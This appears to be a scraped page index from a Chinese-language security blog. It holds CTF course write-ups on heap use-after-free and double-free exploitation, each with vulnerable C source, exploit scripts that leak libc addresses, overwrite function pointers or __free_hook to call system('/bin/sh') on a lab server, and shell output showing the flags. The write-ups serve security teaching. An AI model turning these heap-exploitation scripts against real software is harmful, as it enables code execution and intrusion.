in interactive $ [*] Interrupted [*] Closed connection to 10.113.184.121 port 10056 [*] Stopped process \u0026#39;./chal\u0026#39; (pid 5857) Flag: flag{https://www.youtube.com/watch?v=qbEdlmzQftE\u0026amp;list=PLQoA24ikdy_lqxvb6f70g1xTmj2u-G3NT\u0026amp;index=1}\n"},{"id":399,"href":"/security/course/ntu-cs/pwn/simple-pwn-0x38lab---uaf/","title":"Simple PWN 0x38(Lab - UAF)","section":"Securities","content":" Simple PWN 0x38(Lab - UAF) # Background # Source code # :::spoiler\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void default_handle(char *event) { printf(\u0026#34;EVENT: get event named \\\u0026#34;%s\\\u0026#34;!\\n\u0026#34;, event); } struct entity { char *name; char *event; void (*event_handle)(char *); }; struct entity *entities[0x10]; int read_int() { char buf[0x20]; read(0, buf, 0x1f); return atoi(buf); } int get_idx() { int idx = read_int(); if (idx \u0026gt;= 0x10 || idx \u0026lt; 0) exit(0); return idx; } void memu() { puts(\u0026#34;1. register entity\u0026#34;); puts(\u0026#34;2. delete entity\u0026#34;); puts(\u0026#34;3. set name\u0026#34;); puts(\u0026#34;4. trigger event\u0026#34;); printf(\u0026#34;choice: \u0026#34;); } void register_entity() { int idx; printf(\u0026#34;Index: \u0026#34;); idx = get_idx(); entities[idx] = malloc(sizeof(struct entity)); entities[idx]-\u0026gt;event_handle = default_handle; entities[idx]-\u0026gt;event = \u0026#34;Default Event\u0026#34;; } void delete_entity() { int idx; printf(\u0026#34;Index: \u0026#34;); idx = get_idx(); if (entities[idx]) { free(entities[idx]-\u0026gt;name); free(entities[idx]); } else puts(\u0026#34;Invalid index\u0026#34;); } void set_name() { int idx; int len; printf(\u0026#34;Index: \u0026#34;); idx = get_idx(); if (entities[idx]) { printf(\u0026#34;Nmae Length: \u0026#34;); len = read_int(); if (len == 0) exit(0); entities[idx]-\u0026gt;name = malloc(len); printf(\u0026#34;Name: \u0026#34;); read(0, entities[idx]-\u0026gt;name, len - 1); } else puts(\u0026#34;Invalid index\u0026#34;); } void trigger_event() { int idx; printf(\u0026#34;Index: \u0026#34;); idx = get_idx(); if (entities[idx]) { printf(\u0026#34;Name: %s\\n\u0026#34;, entities[idx]-\u0026gt;name); entities[idx]-\u0026gt;event_handle(entities[idx]-\u0026gt;event); } } int main(void) { setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); printf(\u0026#34;gift1: %p\\n\u0026#34;, \u0026amp;system); void *ptr = malloc(0x10); printf(\u0026#34;gift2: %p\\n\u0026#34;, ptr); for (;;) { memu(); int choice = read_int(); switch (choice) { case 1: register_entity(); break; case 2: delete_entity(); break; case 3: set_name(); break; case 4: trigger_event(); default: puts(\u0026#34;Invalid command\u0026#34;); } } return 0; } :::\nRecon # 這是個經典的表單題，總共有四種command(註冊entity / 刪除entity / 設定entity name / 觸發entitiy function pointer)，這種題目因為格局比較大，所以我都會先看哪裡有malloc或是free，首先\n==註冊entity==→malloc ==設定entity name==→malloc ==刪除entity==→free 然後觀察一下題目一開始會給我們system的address，和一開始的heap address，並且最後可以觸發entity的function pointer，所以目標很清楚 ==設法把function pointer的地址改成system，並且event的部分改成儲存/sh\\x00的地址== 最後只要trigger就會自動開一個shell給我們\n根據background，我們要利用的漏洞就是最後一個，也就是利用相同的大小，把已經free掉的部分拿回來加已利用\n先註冊兩個entity(0和1)，第0個是要利用的部分 把/sh\\x00寫上entity 刪除entity 0 設定system的function pointer 這要特別說明，前面三個步驟都算是正常的步驟，而如果我們設定entity的name，此時系統會malloc一塊空間寫我們輸入的entity name，以這一題來說就會是entity 0(只要大小設定的一樣就好)，因此我們可以寫入包含system address和/sh\\x00的位置，最後再以entity 0的身分trigger該function pointer就可以拿到shell了 gef➤ x/gx 0x00007f706a449d70 0x7f706a449d70 \u0026lt;__libc_system\u0026gt;: 0x74ff8548fa1e0ff3 gef➤ x/s 0x560bb1125300 0x560bb1125300: \u0026#34;sh\u0026#34; 最後我們再利用entity 0的名義，trigger function pointer，就拿到shell了 Exploit # from pwn import * # r = process(\u0026#39;./chal\u0026#39;) r = remote(\u0026#39;10.113.184.121\u0026#39;, 10057) context.arch = \u0026#39;amd64\u0026#39; def register(idx): r.recvuntil(b\u0026#39;choice: \u0026#39;) r.send(b\u0026#39;1\u0026#39;) r.recvuntil(b\u0026#39;Index: \u0026#39;) r.send(str(idx).encode()) def delete(idx): r.recvuntil(b\u0026#39;choice: \u0026#39;) r.send(b\u0026#39;2\u0026#39;) r.recvuntil(b\u0026#39;Index: \u0026#39;) r.send(str(idx).encode()) def set_name(idx, len, name): r.recvuntil(b\u0026#39;choice: \u0026#39;) r.send(b\u0026#39;3\u0026#39;) r.recvuntil(b\u0026#39;Index: \u0026#39;) r.send(str(idx).encode()) r.recvuntil(b\u0026#39;Length: \u0026#39;) r.send(str(len).encode()) r.recvuntil(b\u0026#39;Name: \u0026#39;) r.send(name) def trigger_event(idx): r.recvuntil(b\u0026#39;choice: \u0026#39;) r.send(b\u0026#39;4\u0026#39;) r.recvuntil(b\u0026#39;Index: \u0026#39;) r.send(str(idx).encode()) # Fetch Info r.recvuntil(b\u0026#39;gift1: \u0026#39;) system_addr = int(r.recvline()[:-1], 16) r.recvuntil(b\u0026#39;gift2: \u0026#39;) heap_addr_leak = int(r.recvline()[:-1], 16) log.info(f\u0026#39;System Address = {hex(system_addr)}\u0026#39;) log.info(f\u0026#39;Heap Address = {hex(heap_addr_leak)}\u0026#39;) # Exploit Payload sh_addr = heap_addr_leak + 0x60 register(0) register(1) set_name(1, 0x10, b\u0026#39;sh\\x00\u0026#39;) delete(0) set_name(1, 0x18, p64(0) + p64(sh_addr) + p64(system_addr)) trigger_event(0) r.interactive() $ python exp.py [+] Opening connection to 10.113.184.121 on port 10057: Done [*] System Address = 0x7ff8cd719290 [*] Heap Address = 0x564243d7c2a0 [*] Switching to interactive mode Name: (null) $ cat /home/chal/flag.txt flag{https://www.youtube.com/watch?v=CUSUhXqThjY} 同場加映 # 如何用UAF leak heap address? # 主要的大方向是設法讓free的chunk進入tcache，這樣的話他就會儲存chunk address的info，我們再利用他沒有設為null的UAF漏洞，把他讀出來\nregister(0) register(1) register(2) delete(0) delete(1) set_name(2, 0x18, b\u0026#39;a\u0026#39;) trigger_event(2) r.recvuntil(b\u0026#39;Name: \u0026#39;) leak_heap = u64(r.recv(6).ljust(0x8, b\u0026#39;\\x00\u0026#39;)) heap_base = leak_heap - 0x261 log.success(f\u0026#39;Leak heap address = {hex(leak_heap)}\u0026#39;) log.success(f\u0026#39;Heap base address = {hex(heap_base)}\u0026#39;) $ python exp.py [+] Starting local process \u0026#39;./chal\u0026#39;: pid 5092 [+] Leak heap address = 0x564bd16ca261 [+] Heap base address = 0x564bd16ca000 [*] Switching to interactive mode EVENT: get event named \u0026#34;Default Event\u0026#34;! Invalid command 1. register entity 2. delete entity 3. set name 4. trigger event choice: $ 這一連串的command意思是他先註冊三個entity Delete 前兩個entiti的時候，第一個8 bytes是next free chunk address，第二個8 bytes是key，此時我們就可以想辦法把這個heap address leak出來，從這邊可以看得出來 設定entity 2的name，要加這一段的原因是它會malloc一個0x20的chunk，此時他會從tcache中找，也就是直接找到==0x55e5a806b2e0==，而他在free的時候並沒有把chunk的內容洗掉，所以裡面還是會有chunk address，所以從下面的結果來看，entity 2的name已經指向==0x000055e5a806b2e0==，而這個地址的東西沒有洗掉，所以我們可以用trigger event的printf，leak出其中的內容 此時我們就可以把接收到的address，和vmmap中得到的heap base address扣掉拿到offset之後做後續的利用 如何用UAF leak libc address? # 主要的大方向是設法讓chunk進入unsorted bin中，這樣他就會儲存有關libc的資訊，之後我們再像前面的UAF方法一樣，把值leak出來\n## Leak libc address for i in range(0x9): register(i) set_name(i, 0x88, b\u0026#39;a\u0026#39;) for i in range(0x9): delete(i) for i in range(0x8): register(i) set_name(i, 0x88, b\u0026#39;a\u0026#39;) trigger_event(7) r.recvuntil(b\u0026#39;Name: \u0026#39;) leak_libc = u64(r.recv(6).ljust(0x8, b\u0026#39;\\x00\u0026#39;)) libc_base = leak_libc - 0x1ecc61 system_addr = libc_base + 0x52290 log.success(f\u0026#39;Leak libc address = {hex(leak_libc)}\u0026#39;) log.success(f\u0026#39;Libc base address = {hex(libc_base)}\u0026#39;) log.success(f\u0026#39;System address = {hex(system_addr)}\u0026#39;) $ python exp.py [+] Starting local process \u0026#39;./chal\u0026#39;: pid 5414 [+] Leak libc address = 0x7fd98248dc61 [+] Libc base address = 0x7fd9822a1000 [+] System address = 0x7fd9822f3290 [*] Switching to interactive mode EVENT: get event named \u0026#34;Default Event\u0026#34;! Invalid command 1. register entity 2. delete entity 3. set name 4. trigger event choice: $ 首先要先構造chunks，為了要把tcache塞滿，我們要register 9個chunk，要9個的原因是之後free掉的時候最後一個會被top chunk consolidate，所以被丟到tcache的數量就不滿8個；另外為了要進到unsorted bin中，我們的大小就不能小於0x80，這樣會被丟到fastbin中，所以chunk的順序應該會是entity 0(0x20→0x90)→entity 1(0x20→0x90)\u0026hellip;→entity 8(0x20→0x90)→top 接著就是把東西全部free掉，試圖塞滿tcache，可以從下圖看到他的確把最後一個chunk(0x90)併到top chunk， 從這張圖就很清楚了，entity 0~entity 6(0x20→0x5588cd8236e0 / 0x90→0x5588cd823700)，都已經放到tcache了，那entity 7呢，他剛好因為前後都要被free，所以整個entity 7就被consolidate成0xb0的大小，而且又因為大小不符合fastbin所以被分配到unsorted bin中；而沒什麼重要的entity 8呢?首先就如前面說的，entity 8的0x90被top chunk合併了，而0x20因為tcache滿了，所以放到fastbin了 觀察一下最重要的unsorted bin放了啥，首先本質上，他的fd還是指向unsorted bin的位址，只是該位址同時也是libc中的位址，那如果我們把這個值print出來是否就可以觀察offset的關係 現在我們要想辦法拿到unsorted bin的這個chunk，所以當然要先拿完tcache的所有東西，接著再拿一次register和set_name的時候他就會分別到fastbin拿0x20的chunk和到unsorted bin中拿0x90 最後的結果會像這樣，可以看到entitiy的前7個都是從tcache中拿取，可以和上面的結果對照，接著也和我們預想的一樣，0x20是從fastbin拿取，而進到0x20的chunk會發現他的name指向的位址，就是unsorted bin拿到的0x90 chunk，而再進到0x90 chunk也的確像我們所說，因為他沒有清掉裡面的內容所以還有殘留libc上的info 實際追到要print的時候，會發現如同前面所說，他會print出這個libc address info，接著我們就可以事先算好libc offset和system offset，再做後續的利用 "},{"id":400,"href":"/security/course/ntu-cs/pwn/simple-pwn-0x39lab---double-free/","title":"Simple PWN 0x39(Lab - Double Free)","section":"Securities","content":" Simple PWN 0x39(Lab - Double Free) # Background # 0x18(Lab - babynote)\nSource code # :::spoiler Source Code\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; struct note { char *content; unsigned long len; }; struct note notes[0x10]; int read_int() { char buf[0x20]; read(0, buf, 0x1f); return atoi(buf); } unsigned long read_ul() { char buf[0x20]; read(0, buf, 0x1f); return strtoul(buf, NULL, 10); } int get_idx() { int idx = read_int(); if (idx \u0026gt;= 0x10 || idx \u0026lt; 1) exit(0); return idx; } void add_note() { int idx; printf(\u0026#34;Index: \u0026#34;); idx = get_idx(); printf(\u0026#34;Length: \u0026#34;); notes[idx].len = read_ul(); notes[idx].content = malloc(notes[idx].len); puts(\u0026#34;Add done\u0026#34;); } void read_note() { int idx; printf(\u0026#34;Index: \u0026#34;); idx = get_idx(); printf(\u0026#34;Note[%d]:\\n\u0026#34;, idx); write(1, notes[idx].content, notes[idx].len); } void write_note() { int idx; printf(\u0026#34;Index: \u0026#34;); idx = get_idx(); printf(\u0026#34;Content: \u0026#34;); read(0, notes[idx].content, notes[idx].len); } void delete_note() { int idx; printf(\u0026#34;Index: \u0026#34;); idx = get_idx(); free(notes[idx].content); puts(\u0026#34;Delete done\u0026#34;); } void memu() { puts(\u0026#34;1. add note\u0026#34;); puts(\u0026#34;2. read note\u0026#34;); puts(\u0026#34;3. write note\u0026#34;); puts(\u0026#34;4. delete note\u0026#34;); printf(\u0026#34;choice: \u0026#34;); } int main(void) { setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); int fd = open(\u0026#34;./flag.txt\u0026#34;, O_RDONLY); notes[0].len = 0x30; notes[0].content = malloc(0x30); read(fd, notes[0].content, 0x30); close(fd); for (;;) { memu(); int choice = read_int(); switch (choice) { case 1: add_note(); break; case 2: read_note(); break; case 3: write_note(); break; case 4: delete_note(); break; default: puts(\u0026#34;Invalid command\u0026#34;); } } return 0; } :::\nRecon # :::warning Run On Ubuntu 20.04 ::: 這一題有很多種方式可以拿到shell，不過原理都是一樣的，前置作業都是一樣的，也就是要利用UAF去leak出libc address，接著算出__free_hook以及system的位址，接著想辦法把system寫到__free_hook的位址，此時就有兩種方式可以寫，一種是利用此次學到的double free，把值寫到最後一個在tcache的free chunk，蓋掉他的fd，接著就可以用add_note把tcache的值要回來，並寫system的address進到__free_hook；另一種方式就比較簡單，也就是把free chunk的fd利用UAF的特性改掉，並且直接add_note把東西從tcache要回來，之後就一樣寫system_addr，後free掉一個帶有/bin/sh的chunk，此時就會開一個shell給我們了\n前置作業: Leak Libc Address # 關於這一點可以參考如何用UAF leak libc address?，方法都一樣，首先要想辦法讓free chunk進到unsorted bin中(最簡單的方法就是設定超過0x410的空間)，接著因為malloc的時候沒有實作清空原本的資料，導致我們可以leak其中有關libc section的資訊。底下的設定意思是我們先設定三個notes，#14的意思是不要讓#13被free掉的時候被consolidate用的，接著我們把前兩個free掉，結果如下 會發現#12和#13被consolidate在一起了，接著我們看其中的一些資訊 裡面確實存著libc相關的資訊，接著只要把這一塊chunk malloc出去給隨便一個note，接著讀其中的資料就可以讀出libc address了\nadd_note(12, 0x420) add_note(13, 0x420) add_note(14, 0x420) del_note(12) del_note(13) add_note(12, 0x420) read_note(12) leak_libc = u64(r.recv(8)) libc_base = leak_libc - 0x1ed0e0 system_addr = libc_base + libc.symbols[\u0026#39;system\u0026#39;] free_hook = libc_base + 0x1eee48 log.success(f\u0026#39;Leak Libc = {hex(leak_libc)}\u0026#39;) log.success(f\u0026#39;Libc Base = {hex(libc_base)}\u0026#39;) log.success(f\u0026#39;System Address = {hex(system_addr)}\u0026#39;) log.success(f\u0026#39;Free Hook = {hex(free_hook)}\u0026#39;) r.recv(0x420 - 0x8) 方法一: Double Fee # 有了libc address後，我們要想辦法把system address寫到__free_hook的位置，如果是要用double free的方法的話可以參考上課的講義: 最簡單的方法是，我把tcache填滿(一定要)，然後用free(a)→free(b)→free(a)的順序產生double free\nfor i in range(1, 0xa): add_note(i, 0x10) for i in range(1, 0x8): del_note(i) del_note(8) del_note(9) del_note(8) 此時的heapinfo會變成: 接著我們把tcache清空後再繼續add_note就會把fastbin的free chunk搬到tcache中\nadd_note(8, 0x18) 接著我們寫free_hook address到note #8，這樣的話，tcache的順序就會變成下圖:\nwrite_note(8, p64(free_hook)) 此時我們就把free chunk變成free_hook的地址，我們只不斷的add_note，就可以把tcache的free chunk要回來進行寫入，也就是寫system address:\nbin_sh = u64(b\u0026#39;/bin/sh\\x00\u0026#39;) add_note(9, 0x10) write_note(9, p64(bin_sh)) add_note(10, 0x10) add_note(11, 0x10) write_note(11, p64(system_addr)) 最後的結果如上圖，會發現note #11已經變成==0x7f900aa8ae48==，這個就是__free_hook的位址，進去看發現已經被我們寫入system address，這個時候我們只要把含有/bin/sh\\x00的note #9 free掉，就可以開shell了\n方法二: 一般的寫入 # 這一個方法比較方便，也和double free沒關係，反正我們只要利用UAF的特性，也可以把free chunk的fd改掉，再用像前面的方法就可以開shell\n下面的建構就是先開兩個note，然後free掉，此時我們就可以利用UAF的漏洞把free chunk的fd改掉，結果如下圖 add_note(1, 0x18) add_note(2, 0x18) del_note(2) del_note(1) write_note(1, p64(free_hook) + p64(0) * 2) 接著就把/bin/sh\\x00寫到note #2，接著就不斷add_note，把__free_hook的address拿到手，然後再把system address寫到__free_hook，最後把含有/bin/sh\\x00的note #2 free掉，結果如下圖: 從上圖得知，note #4的address已經被我們換成__free_hook address，並且實際跟進去就是system address，最後只要free掉note #2就可以開shell了\nExploit - Leak Libc(UAF) + Double Free(?) # :::spoiler Method 1\nfrom pwn import * r = process(\u0026#39;./chal\u0026#39;) r = remote(\u0026#39;10.113.184.121\u0026#39;, 10058) libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) context.arch = \u0026#39;amd64\u0026#39; def add_note(idx, len): r.recvuntil(b\u0026#39;choice: \u0026#39;) r.send(b\u0026#39;1\u0026#39;) r.recvuntil(b\u0026#39;Index: \u0026#39;) r.send(str(idx).encode()) r.recvuntil(b\u0026#39;Length: \u0026#39;) r.send(str(len).encode()) def read_note(idx): r.recvuntil(b\u0026#39;choice: \u0026#39;) r.send(b\u0026#39;2\u0026#39;) r.recvuntil(b\u0026#39;Index: \u0026#39;) r.send(str(idx).encode()) r.recvline() def write_note(idx, content): r.recvuntil(b\u0026#39;choice: \u0026#39;) r.send(b\u0026#39;3\u0026#39;) r.recvuntil(b\u0026#39;Index: \u0026#39;) r.send(str(idx).encode()) r.recvuntil(b\u0026#39;Content: \u0026#39;) r.send(content) def del_note(idx): r.recvuntil(b\u0026#39;choice: \u0026#39;) r.send(b\u0026#39;4\u0026#39;) r.recvuntil(b\u0026#39;Index: \u0026#39;) r.send(str(idx).encode()) # Leak libc address add_note(12, 0x420) add_note(13, 0x420) add_note(14, 0x420) del_note(12) del_note(13) add_note(12, 0x420) read_note(12) leak_libc = u64(r.recv(8)) libc_base = leak_libc - 0x1ed0e0 system_addr = libc_base + libc.symbols[\u0026#39;system\u0026#39;] free_hook = libc_base + 0x1eee48 log.success(f\u0026#39;Leak Libc = {hex(leak_libc)}\u0026#39;) log.success(f\u0026#39;Libc Base = {hex(libc_base)}\u0026#39;) log.success(f\u0026#39;System Address = {hex(system_addr)}\u0026#39;) log.success(f\u0026#39;Free Hook = {hex(free_hook)}\u0026#39;) r.recv(0x420 - 0x8) ## Use Double Free to Write system_addr to __free_hook for i in range(1, 0xa): add_note(i, 0x10) for i in range(1, 0x8): del_note(i) del_note(8) del_note(9) del_note(8) ### Clean tcache for i in range(1, 0x8): add_note(i, 0x10) add_note(8, 0x18) write_note(8, p64(free_hook)) bin_sh = u64(b\u0026#39;/bin/sh\\x00\u0026#39;) add_note(9, 0x10) write_note(9, p64(bin_sh)) add_note(10, 0x10) add_note(11, 0x10) write_note(11, p64(system_addr)) del_note(9) r.interactive() :::\n:::spoiler Method 2\nfrom pwn import * r = process(\u0026#39;./chal\u0026#39;) r = remote(\u0026#39;10.113.184.121\u0026#39;, 10058) libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) context.arch = \u0026#39;amd64\u0026#39; def add_note(idx, len): r.recvuntil(b\u0026#39;choice: \u0026#39;) r.send(b\u0026#39;1\u0026#39;) r.recvuntil(b\u0026#39;Index: \u0026#39;) r.send(str(idx).encode()) r.recvuntil(b\u0026#39;Length: \u0026#39;) r.send(str(len).encode()) def read_note(idx): r.recvuntil(b\u0026#39;choice: \u0026#39;) r.send(b\u0026#39;2\u0026#39;) r.recvuntil(b\u0026#39;Index: \u0026#39;) r.send(str(idx).encode()) r.recvline() def write_note(idx, content): r.recvuntil(b\u0026#39;choice: \u0026#39;) r.send(b\u0026#39;3\u0026#39;) r.recvuntil(b\u0026#39;Index: \u0026#39;) r.send(str(idx).encode()) r.recvuntil(b\u0026#39;Content: \u0026#39;) r.send(content) def del_note(idx): r.recvuntil(b\u0026#39;choice: \u0026#39;) r.send(b\u0026#39;4\u0026#39;) r.recvuntil(b\u0026#39;Index: \u0026#39;) r.send(str(idx).encode()) # Leak libc address add_note(12, 0x420) add_note(13, 0x420) add_note(14, 0x420) del_note(12) del_note(13) add_note(12, 0x420) read_note(12) leak_libc = u64(r.recv(8)) libc_base = leak_libc - 0x1ed0e0 system_addr = libc_base + libc.symbols[\u0026#39;system\u0026#39;] free_hook = libc_base + 0x1eee48 log.success(f\u0026#39;Leak Libc = {hex(leak_libc)}\u0026#39;) log.success(f\u0026#39;Libc Base = {hex(libc_base)}\u0026#39;) log.success(f\u0026#39;System Address = {hex(system_addr)}\u0026#39;) log.success(f\u0026#39;Free Hook = {hex(free_hook)}\u0026#39;) r.recv(0x420 - 0x8) ## Another Way to Write system_addr to __free_hook add_note(1, 0x18) add_note(2, 0x18) del_note(2) del_note(1) write_note(1, p64(free_hook) + p64(0) * 2) bin_sh = u64(b\u0026#39;/bin/sh\\x00\u0026#39;) write_note(2, p64(bin_sh)) add_note(3, 0x18) add_note(4, 0x18) write_note(4, p64(system_addr)) raw_input() del_note(2) r.interactive() :::\n"},{"id":401,"href":"/security/course/ntu-cs/pwn/simple-pwn-0x402023-hw---uaf++/","title":"Simple PWN 0x40(2023 HW - UAF++)","section":"Securities","content":" Simple PWN 0x40(2023 HW - UAF++) # Background # 0x34(2023 Lab - UAF):three:\nSource code # :::spoiler Source Code\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void default_handle(char *event) { printf(\u0026#34;EVENT: get event named \\\u0026#34;%s\\\u0026#34;!\\n\u0026#34;, event); } struct entity { char *name; char *event; void (*event_handle)(char *); }; struct entity *entities[0x2]; int read_int() { char buf[0x20]; read(0, buf, 0x1f); return atoi(buf); } int get_idx() { int idx = read_int(); if (idx \u0026gt;= 0x2 || idx \u0026lt; 0) exit(0); return idx; } void memu() { puts(\u0026#34;1. register entity\u0026#34;); puts(\u0026#34;2. delete entity\u0026#34;); puts(\u0026#34;3. trigger event\u0026#34;); printf(\u0026#34;choice: \u0026#34;); } void register_entity() { int idx; int len; printf(\u0026#34;Index: \u0026#34;); idx = get_idx(); entities[idx] = malloc(sizeof(struct entity)); entities[idx]-\u0026gt;event = \u0026#34;Default Event\u0026#34;; entities[idx]-\u0026gt;event_handle = default_handle; printf(\u0026#34;Nmae Length: \u0026#34;); len = read_int(); if (len == 0 || len \u0026gt; 0x430) exit(0); entities[idx]-\u0026gt;name = malloc(len); printf(\u0026#34;Name: \u0026#34;); read(0, entities[idx]-\u0026gt;name, len - 1); } void delete_entity() { int idx; printf(\u0026#34;Index: \u0026#34;); idx = get_idx(); if (entities[idx]) { free(entities[idx]-\u0026gt;name); free(entities[idx]); } else puts(\u0026#34;Invalid index\u0026#34;); } void trigger_event() { int idx; printf(\u0026#34;Index: \u0026#34;); idx = get_idx(); if (entities[idx]) { printf(\u0026#34;Name: %s\\n\u0026#34;, entities[idx]-\u0026gt;name); entities[idx]-\u0026gt;event_handle(entities[idx]-\u0026gt;event); } } int main(void) { setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); for (;;) { memu(); int choice = read_int(); switch (choice) { case 1: register_entity(); break; case 2: delete_entity(); break; case 3: trigger_event(); default: puts(\u0026#34;Invalid command\u0026#34;); } } return 0; } :::\nRecon # :::info\n這一題是run在==20.04==的環境，在做題目之前要先看一下docker file 另外一個很重要的一點是題目是用==read==讀取輸入，所以我們不需要輸入null byte結尾 ::: 這一題和lab有幾個關鍵的地方不太一樣，首先他把set_name的操作併到register的地方，另外他限制註冊的entity只能有==2個==，最重要的一點是他沒有給我們heap address或system address的天大好禮，所以我們還要想一下其他的方法\n首先，思路會是先想辦法leak libc address，並且利用像lab的方式把system function trigger起來開一個shell給我們\nleak libc的策略如下，就像background提到的，要leak libc就要先想辦法把chunk丟到unsorted bin中，所以大小不能太小，lab的作法是先把tcache填滿再free一個0x88(就是不會被丟到fastbin的大小)，不過因為這一題只能讓我們註冊兩個entity，所以有沒有甚麼方式是可以直接丟到unsorted bin?那就是直接註冊超過0x410的大小，這樣free的時候就會被丟到unsorted bin\nregister(0, 0x420, b\u0026#39;a\u0026#39;) register(1, 0x420, b\u0026#39;a\u0026#39;) delete(0) delete(1) register(0, 0x420, b\u0026#39;a\u0026#39;) trigger_event(0) 下圖為停在delete完後的結果，因為entity 1的0x420被consolidate所以沒有被顯示出來 而再註冊一次的意思是要把unsorted bin的空間拿回來，又因為他沒有把空間洗掉，所以我們後面再trigger的時候他會把東西印出來給我們，從下圖可以知道entity 0的name指向==0x00005575416a52c0==，也就是一開始從unsorted bin拿到的chunk address，而裡面的數值也的確還殘留 如果實際trigger entity 0會如下圖一樣，print出name指向的東西 既然可以leak出libc的地址，當然我們也可以寫值進去，我們的目標是開一個shell，而唯一可以執行function的就是在trigger event的地方，假設我們可以寫成如下圖一樣，是不是就可以觸發shell了 要達成如上的效果，我會先reset各個entity，為甚麼要設定0x20之後會用到\nregister(0, 0x20, b\u0026#39;a\u0026#39;) register(0, 0x20, b\u0026#39;a\u0026#39;) register(1, 0x20, b\u0026#39;a\u0026#39;) 仔細看source code中註冊的部分，他一共會malloc兩個空間，一個是固定0x20的entity，另外一個就是我們自己設定的name空間，這個空間可以寫值；另外call function pointer的時候，也就是在trigger event的地方，他只會針對剛剛提到的0x20 entity space去call function，所以我們要想辦法把我們寫進去的值==被當成0x20的entity==，這樣的話就可以直接call system了，這最後一步想了超級久，原本是想隔天在戰，結果躺在床上五分鐘就來靈感了，再花五分鐘就把問題解掉了😑\n具體流程如下\ndelete(1) delete(0) register(0, 0x18, p64(0) + p64(bin_sh_addr) + p64(system_addr)) trigger_event(1) 首先把這兩個entity都free掉，這樣回收區就會如下圖一樣 接著我們註冊entity 0，又因為這一次要的空間是0x18，所以他會把前面entity 1的空間都拿回來使用，如果我們又把開shell的資訊寫進去，就會如下圖 此時原本被free掉的entity 1的空間就會變成entity 0的name space，此時我們只要trigger entity 1就會開shell了，如下圖 Exploit # from pwn import * # r = process(\u0026#39;./chal\u0026#39;) r = remote(\u0026#39;10.113.184.121\u0026#39;, 10059) context.arch = \u0026#39;amd64\u0026#39; def register(idx, name_len, name): r.recvuntil(b\u0026#39;choice: \u0026#39;) r.send(b\u0026#39;1\u0026#39;) r.recvuntil(b\u0026#39;Index: \u0026#39;) r.send(str(idx).encode()) r.recvuntil(b\u0026#39;Nmae Length: \u0026#39;) r.send(str(name_len).encode()) r.recvuntil(b\u0026#39;Name: \u0026#39;) r.send(name) def delete(idx): r.recvuntil(b\u0026#39;choice: \u0026#39;) r.send(b\u0026#39;2\u0026#39;) r.recvuntil(b\u0026#39;Index: \u0026#39;) r.send(str(idx).encode()) def trigger_event(idx): r.recvuntil(b\u0026#39;choice: \u0026#39;) r.send(b\u0026#39;3\u0026#39;) r.recvuntil(b\u0026#39;Index: \u0026#39;) r.send(str(idx).encode()) # Fetch Info ## Leak libc address register(0, 0x420, b\u0026#39;a\u0026#39;) register(1, 0x420, b\u0026#39;a\u0026#39;) delete(0) delete(1) register(0, 0x420, b\u0026#39;a\u0026#39;) trigger_event(0) r.recvuntil(b\u0026#39;Name: \u0026#39;) leak_libc = u64(r.recv(6).ljust(0x8, b\u0026#39;\\x00\u0026#39;)) libc_base = leak_libc - 0x1ecb61 system_addr = libc_base + 0x52290 log.success(f\u0026#39;Leak libc address = {hex(leak_libc)}\u0026#39;) log.success(f\u0026#39;Libc base address = {hex(libc_base)}\u0026#39;) log.success(f\u0026#39;System address = {hex(system_addr)}\u0026#39;) print(r.recvlines(3)) ## Leak heap address bin_sh_addr = libc_base + 0x00000000001b45bd ### To reset entities register(0, 0x20, b\u0026#39;a\u0026#39;) register(0, 0x20, b\u0026#39;a\u0026#39;) register(1, 0x20, b\u0026#39;a\u0026#39;) delete(1) delete(0) register(0, 0x18, p64(0) + p64(bin_sh_addr) + p64(system_addr)) trigger_event(1) r.interactive() $ python exp.py [+] Opening connection to 10.113.184.121 on port 10059: Done [+] Leak libc address = 0x7f890a134b61 [+] Libc base address = 0x7f8909f48000 [+] System address = 0x7f8909f9a290 [b\u0026#39;\u0026#39;, b\u0026#39;EVENT: get event named \u0026#34;Default Event\u0026#34;!\u0026#39;, b\u0026#39;Invalid command\u0026#39;] [*] Switching to interactive mode Name: (null) $ cat /home/chal/flag.txt flag{Y0u_Kn0w_H0w_T0_0veR1aP_N4me_aNd_EnT1Ty!!!} Flag: flag{Y0u_Kn0w_H0w_T0_0veR1aP_N4me_aNd_EnT1Ty!!!}\n"},{"id":402,"href":"/security/course/ntu-cs/reverse/simple-reverse---0x01lab---sacred-arts/","title":"Simple Reverse - 0x01(Lab - Sacred Arts)","section":"Securities","content":" Simple Reverse - 0x01(Lab - Sacred Arts) # Background # X86組合語言/基本指令集 neg (Negate) instruction 實作：先在執行neg rax之前把$rax設定成2，執行指令之後剛好是2的補數 gef➤ set $rax=2 gef➤ info r $rax rax 0x2 0x2 gef➤ ni 0x00000000004010e0 in ?? () gef➤ info r $rax rax 0xfffffffffffffffe 0xfffffffffffffffe X86組合語言/基本指令集/IA32指令:xchg 實作：執行xchg ah, al之前先看一下$rax的狀態 gef➤ info r $rax rax 0xfffffffffffffffe 0xfffffffffffffffe gef➤ ni 0x00000000004010e2 in ?? () gef➤ info r $rax rax 0xfffffffffffffeff 0xfffffffffffffeff Source Code # :::spoiler IDA Pro Disassembler Code\nstart: ; DATA XREF: LOAD:0000000000400018↑o ; LOAD:0000000000400088↑o 48 C7 C0 02 00 00 00 mov rax, 2 48 C7 C7 1C 10 40 00 mov rdi, offset aTmpFlag ; \u0026#34;/tmp/flag\u0026#34; 48 C7 C6 00 00 00 00 mov rsi, 0 0F 05 syscall ; LINUX - sys_open 49 89 C7 mov r15, rax EB 0A jmp short loc_401026 ; --------------------------------------------------------------------------- 2F 74 